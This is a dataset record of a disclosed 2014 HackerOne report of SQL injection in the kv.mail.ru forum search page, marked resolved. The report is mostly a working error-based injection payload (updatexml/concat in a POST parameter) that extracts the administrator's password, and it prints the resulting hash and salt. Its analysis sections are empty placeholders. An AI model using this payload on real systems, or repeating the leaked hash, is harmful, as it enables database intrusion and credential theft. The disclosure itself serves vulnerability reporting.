---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '9919'
original_report_id: '9919'
title: SQL injection [дырка в движке форума]
weakness: SQL Injection
team_handle: mailru
created_at: '2014-04-26T20:07:59.131Z'
disclosed_at: '2014-11-16T18:46:32.947Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# SQL injection [дырка в движке форума]

## Metadata

- HackerOne Report ID: 9919
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-11-16T18:46:32.947Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

URL: http://kv.mail.ru/forum/search.php?do=process
POST DATA: s=&securitytoken=guest&do=process&query=1&submit.x=5&submit.y=10&humanverify[]=&searchfromtype=vBForum%3ASocialGroupMessage&do=process&contenttypeid=5&categoryid[]=-99)or(updatexml(1,concat(0x3a,(Select+password+from+user+where+userid=1+limit+0,1)),1))+--+
результат - e2698658826e93ffc97ebad2ac7bc76 мд5 пасса админа без соли (соль c:8)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
